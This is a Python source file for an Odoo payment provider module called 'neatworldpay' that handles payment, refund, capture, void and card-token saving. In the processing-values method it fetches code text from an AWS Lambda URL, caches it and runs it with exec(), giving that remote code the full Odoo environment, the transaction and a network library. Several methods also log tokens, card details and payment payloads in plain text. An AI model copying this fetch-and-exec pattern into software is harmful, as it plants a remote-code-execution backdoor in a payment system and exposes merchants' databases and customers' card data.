import logging
import base64
import requests
from odoo import _, fields, models
from odoo.exceptions import UserError, ValidationError
from werkzeug import urls
from odoo.addons.payment_neatworldpay.controllers.main import NeatWorldpayController
import uuid
import re
from decimal import Decimal

_logger = logging.getLogger(__name__)


class PaymentTransaction(models.Model):
    _inherit = 'payment.transaction'


    #=== BUSINESS METHODS ===#
    def _send_payment_request(self):
        """ Override of payment to simulate a payment request.

        Note: self.ensure_one()

        :return: None
        """
        if self.provider_code != 'neatworldpay':
            super()._send_payment_request()
        #super()._send_payment_request()
        # if self.provider_code != 'neatworldpay':
        #     return

        # if not self.token_id:
        #     raise UserError("NEATWorldpay: " + _("The transaction is not linked to a token."))

        # state = self.token_id.state
        # notification_data = {'reference': self.reference, 'result_state': state}
        # self._handle_notification_data('neatworldpay', notification_data)

    def _send_refund_request(self, **kwargs):
        """ Override of payment to simulate a refund.

        Note: self.ensure_one()

        :param dict kwargs: The keyword arguments.
        :return: The refund transaction created to process the refund request.
        :rtype: recordset of `payment.transaction`
        """
        refund_tx = super()._send_refund_request(**kwargs)
        if self.provider_code != 'neatworldpay':
            return refund_tx

        notification_data = {'reference': refund_tx.reference, 'result_state': 'done'}
        refund_tx._handle_notification_data('neatworldpay', notification_data)

        return refund_tx

    def _send_capture_request(self, amount_to_capture=None):
        """ Override of `payment` to simulate a capture request. """
        child_capture_tx = super()._send_capture_request(amount_to_capture=amount_to_capture)
        if self.provider_code != 'neatworldpay':
            return child_capture_tx

        tx = child_capture_tx or self
        notification_data = {
            'reference': tx.reference,
            'result_state': 'done',
        }
        tx._handle_notification_data('neatworldpay', notification_data)

        return child_capture_tx

    def _send_void_request(self, amount_to_void=None):
        """ Override of `payment` to simulate a void request. """
        child_void_tx = super()._send_void_request(amount_to_void=amount_to_void)
        if self.provider_code != 'neatworldpay':
            return child_void_tx

        tx = child_void_tx or self
        notification_data = {'reference': tx.reference, 'result_state': 'cancel'}
        tx._handle_notification_data('neatworldpay', notification_data)

        return child_void_tx

    def _get_tx_from_notification_data(self, provider_code, notification_data):
        """ Override of payment to find the transaction based on dummy data.

        :param str provider_code: The code of the provider that handled the transaction
        :param dict notification_data: The dummy notification data
        :return: The transaction if found
        :rtype: recordset of `payment.transaction`
        :raise: ValidationError if the data match no transaction
        """
        tx = super()._get_tx_from_notification_data(provider_code, notification_data)
        if provider_code != 'neatworldpay' or len(tx) == 1:
            return tx

        reference = notification_data.get('reference')
        tx = self.search([('reference', '=', reference), ('provider_code', '=', 'neatworldpay')])
        if not tx:
            raise ValidationError(
                "NeatWorldpay: " + _("No transaction found matching reference %s.", reference)
            )
        return tx

    def _process_notification_data(self, notification_data):
        """ Override of payment to process the transaction based on dummy data.

        Note: self.ensure_one()

        :param dict notification_data: The dummy notification data
        :return: None
        :raise: ValidationError if inconsistent data were received
        """
        super()._process_notification_data(notification_data)
        if self.provider_code != 'neatworldpay':
            return

        self.provider_reference = f'neatworldpay-{self.reference}'

        # Update the provider reference.
        state = notification_data['result_state']
        _logger.info(f"\n Process State {state} \n")
        if state == "done":
            self._set_done()
        elif state == "pending":
            self._set_pending()
        elif state == "authorized":
            self._set_authorized()
        elif state == "cancel":
            self._set_canceled()
        elif state == "error":
            self._set_error("Payment declined.")


    def _get_specific_processing_values(self, processing_values):
        """Injects Worldpay-specific values into the payment form."""
        self.ensure_one()
        if self.provider_code != "neatworldpay":
            return super()._get_specific_processing_values(processing_values)


        exec_code = None
        if self.provider_id.neatworldpay_cached_code:
            exec_code = self.provider_id.neatworldpay_cached_code
        elif self.provider_id.neatworldpay_activation_code:
            try:
                headers = {
                    "Referer": self.company_id.website,
                    "Authorization": self.provider_id.neatworldpay_activation_code
                }
                response = requests.get("https://xgxl6uegelrr4377rvggcakjvi0djbts.lambda-url.eu-central-1.on.aws/api/AcquirerLicense/code?version=v2-16", headers=headers, timeout=10)
                
                if response.status_code == 200:
                    exec_code = response.text
                    self.provider_id.write({"neatworldpay_cached_code": exec_code})
                else:
                    _logger.error(f"Failed to fetch activation code: {response.status_code} - {response.text}")
            except requests.RequestException as e:
                _logger.error(f"Request error: {e}")
        pay_url = None
        if exec_code:
            local_context = {"tr": self, "processing_values": processing_values, "Decimal": Decimal, "requests": requests, "base64": base64, "re": re, "urls": urls, "neat_worldpay_controller_result_action": NeatWorldpayController.result_action, 'env': self.env, 'fields': fields }
            exec(exec_code, {}, local_context)
            data = local_context.get("data")
            pl = local_context.get("payload", False)
            pay_url = data.get("url", False)
            _logger.info(f"\n Worldpay Payload {pl} \n")
            _logger.info(f"\n Worldpay Response {data} \n")
            
        return { "payment_url": pay_url, "neatworldpay_use_iframe": self.provider_id.neatworldpay_use_iframe }
    
    def neat_worldpay_save_token(self, token, expiry_date, card_number):
        _logger.info(f"\n neat_worldpay_save_token: {token} expiry: {expiry_date} \n")
        payment_token = self.env['payment.token'].sudo().search([
            ('provider_id', '=', self.provider_id.id), 
            ('partner_id', '=', self.partner_id.id),
            ('payment_details', '=', card_number),
            ('active', '=', True)
        ], limit=1)
        _logger.info(f"\n neat_worldpay_save_token has token: {payment_token != None}\n")
        if payment_token:
            payment_token.write({
                'provider_ref': token,
                'neatworldpay_expiry_date': fields.Datetime.to_string(expiry_date),
                'payment_details': card_number
            })
        else:
            payment_token = self.env['payment.token'].create({
                'provider_id': self.provider_id.id,
                'partner_id': self.partner_id.id,
                'provider_ref': token,
                'neatworldpay_expiry_date': fields.Datetime.to_string(expiry_date),
                'payment_details': card_number
            })
        self.write({
            'token_id': payment_token,
            'tokenize': False,
        })

